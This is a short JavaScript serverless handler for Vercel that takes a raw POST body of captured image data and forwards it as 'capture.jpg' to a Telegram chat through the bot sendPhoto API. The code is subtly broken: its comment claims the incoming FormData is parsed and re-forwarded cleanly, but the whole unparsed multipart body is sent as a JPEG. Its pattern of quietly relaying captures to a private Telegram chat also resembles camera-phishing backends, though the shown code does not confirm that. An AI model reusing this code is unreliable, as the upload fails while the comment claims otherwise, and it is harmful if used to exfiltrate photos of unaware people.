import fetch from 'node-fetch';
import FormData from 'form-data';

// Vercel config to allow parsing binary files correctly
export const config = {
    api: {
        bodyParser: false,
    },
};

// Helper function to turn the incoming request stream into a buffer
function getRequestBodyBuffer(req) {
    return new Promise((resolve, reject) => {
        let chunks = [];
        req.on('data', (chunk) => chunks.push(chunk));
        req.on('end', () => resolve(Buffer.concat(chunks)));
        req.on('error', (err) => reject(err));
    });
}

export default async function handler(req, MilfordRes) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return MilfordRes.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        // Pull our hidden tokens from the environment variables
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            return MilfordRes.status(500).json({ error: 'Server missing API configuration.' });
        }

        // 1. Read the raw image data coming from the frontend
        const rawBody = await getRequestBodyBuffer(req);

        // 2. Prepare the payload for Telegram
        // Because the frontend sent FormData, we parse/re-forward it cleanly
        const telegramForm = new FormData();
        telegramForm.append('chat_id', CHAT_ID);
        
        // We simulate the file stream from the buffer we captured
        telegramForm.append('photo', rawBody, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg',
        });

        // 3. Fire the request to Telegram's sendPhoto API endpoint
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            body: telegramForm,
            headers: telegramForm.getHeaders() // Crucial for multi-part boundary flags
        });

        const telegramResult = await telegramResponse.json();

        if (telegramResult.ok) {
            return MilfordRes.status(200).json({ success: true });
        } else {
            console.error("Telegram API Error:", telegramResult);
            return MilfordRes.status(500).json({ error: telegramResult.description || 'Telegram rejection' });
        }

    } catch (error) {
        console.error("Backend Error:", error);
        return MilfordRes.status(500).json({ error: 'Internal Server Error' });
    }
}